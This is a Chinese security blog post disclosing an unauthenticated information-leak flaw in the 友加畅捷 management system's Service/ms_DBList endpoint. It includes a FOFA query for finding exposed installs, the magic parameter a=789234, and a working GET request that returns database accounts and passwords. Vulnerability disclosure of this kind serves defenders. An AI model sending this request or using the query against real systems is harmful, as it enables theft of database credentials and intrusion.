---
title: "友加畅捷管理系统 Service/ms_DBLis 未授权访问致信息泄露漏洞"
source: https://mrxn.net/jswz/youjiasoft-Service-ms_DBList-data-leak.html
asset_dir: assets/友加畅捷管理系统-servicems_dblis-未授权访问致信息泄露漏洞
---

# 友加畅捷管理系统 Service/ms\_DBLis 未授权访问致信息泄露漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/11/29 08:06
- 601浏览
- [0评论](#comment)
- 5分钟阅读

深入探索

授权

数据库

安全

---

# 漏洞简介

友加畅捷管理系统是一款专为小微商贸流通企业设计的财务业务一体化管理[软件](#)，涵盖进销存、财务、分销及移动管理等多个模块，旨在帮助企业实现高效的业务运营和财务核算。

网络安全

该系统的 `Service/ms_DBList` 接口存在[未授权访问](https://mrxn.net/tag/%E6%9C%AA%E6%8E%88%E6%9D%83)漏洞，攻击者无需任何认证即可直接访问该接口，从而获取敏感信息。此漏洞可能导致企业内部数据[泄露](https://mrxn.net/tag/%E6%B3%84%E9%9C%B2)，包括但不限于用户列表、配置信息等，对企业的运营安全和数据隐私构成严重威胁。

# 影响版本

13.7004.1053.1000

# fofa语法

> icon\_hash="2049187099" || fid="zzt8lL7SUwIIZQXZY6rTSw=="

# 漏洞分析

在 `ServiceController` 找到 `ms_DBList` 方法处理逻辑如下

漏洞修复方案

[![友加畅捷管理系统 Service/ms_DBLis 未授权访问致信息泄露漏洞](images/img-001-e2e7d7410e61.webp)](https://image.mrxn.net/8d49dc246a5146b08ba19bfc860ebd9a.webp)

当参数`a=789234`时，方法直接返回`DBInfo`列表，包含`address`、`account`、`pwd`等敏感字段，从而造成敏感[信息泄露](https://mrxn.net/tag/%E6%B3%84%E9%9C%B2)。

深入探索

防火墙软件

SQL注入防护

Web安全课程

DBListSMS 方法类似

[![友加畅捷管理系统 Service/ms_DBLis 未授权访问致信息泄露漏洞](images/img-002-c6de8035bad5.webp)](https://image.mrxn.net/40e5cb6c20044513a6e58df9300a392a.webp)

# 漏洞复现

深入探索

网络安全会议

安全研究工具

恶意软件分析工具

```
GET /Service/ms_DBList?a=789234 HTTP/1.1
Host: youjiasoft.mrxn.net
```

[![友加畅捷管理系统 Service/ms_DBLis 未授权访问致信息泄露漏洞](images/img-003-01dc7d6f07e3.webp)](https://image.mrxn.net/338fe852246d4aacbdd4352556a52a95.webp)

响应回显数据库账户密码等敏感信息

物流软件安全

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#未授权](https://mrxn.net/tag/%E6%9C%AA%E6%8E%88%E6%9D%83)
- [#asp.net](https://mrxn.net/tag/asp.net)
- [#泄露](https://mrxn.net/tag/%E6%B3%84%E9%9C%B2)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
